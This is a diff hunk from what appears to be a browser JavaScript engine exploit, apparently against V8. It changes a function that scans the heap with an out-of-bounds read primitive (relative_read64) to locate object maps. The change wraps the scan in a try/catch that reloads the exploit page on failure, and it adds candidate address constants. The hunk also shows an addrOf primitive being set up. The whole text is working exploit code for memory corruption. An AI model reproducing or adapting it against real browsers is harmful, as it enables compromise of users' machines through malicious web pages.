@@ -221,33 +221,42 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
         const old_space = 0x200000;
         //0027e121
         //27d4f1
+        //01b0c2f1
+        //02156509
+        //01c2f2d9
         const array_map = 0x27d4f1;
 
         let start_offset = Math.floor(old_space / 8) + 3;
+        try{
+            for (var i = start_offset; i < start_offset + 0x6b000; i++) {
+              let value = relative_read64(i);
+              
+              helpers.set_i64(value);
+              var [hi, lo] = helpers.get_u32_pair();
 
-        for (var i = start_offset; i < start_offset + 0x6b000; i++) {
-            let value = relative_read64(i);
-            
-            helpers.set_i64(value);
-            var [hi, lo] = helpers.get_u32_pair();
+              if (hi == 2734n || lo == 2734n) {
+                  let prev2 = relative_read64(i - 2);
+                  let prev1 = relative_read64(i - 1);
 
-            if (hi == 2734n || lo == 2734n) {
-                let prev2 = relative_read64(i - 2);
-                let prev1 = relative_read64(i - 1);
-
-                helpers.set_i64(prev2);
-                var [_, prev_hi] = helpers.get_u32_pair();
-                
-                helpers.set_i64(prev1);
-                var [prev_lo, _] = helpers.get_u32_pair();
-                alert(hex(prev_hi)+hex(prev_lo));
-                // if (prev_hi == array_map || prev_lo == array_map) {
-                if(((prev_hi & old_space == old_space) && (prev_lo == 0x2261)) || ((prev_lo & old_space == old_space))){
-                    alert("[+]find !");
-                    return [i, hi == 2734n ? 0 : 1];
-                }
-            }   
+                  helpers.set_i64(prev2);
+                  var [_, prev_hi] = helpers.get_u32_pair();
+                  
+                  helpers.set_i64(prev1);
+                  var [prev_lo, _] = helpers.get_u32_pair();
+                  alert(hex(prev_hi)+hex(prev_lo));
+                  // if (prev_hi == array_map || prev_lo == array_map) {
+                  if(((prev_hi & old_space == old_space) && (prev_lo == 0x2261)) || ((prev_lo & old_space == old_space))){
+                      alert("[+]find !");
+                      return [i, hi == 2734n ? 0 : 1];
+                  }
+              }   
+          }
+        }catch(e){
+          alert(e);
+          location.hred = "exp.html"
+          window.location.reload();
         }
+        
     }
 
     function caged_addrOf(object) {
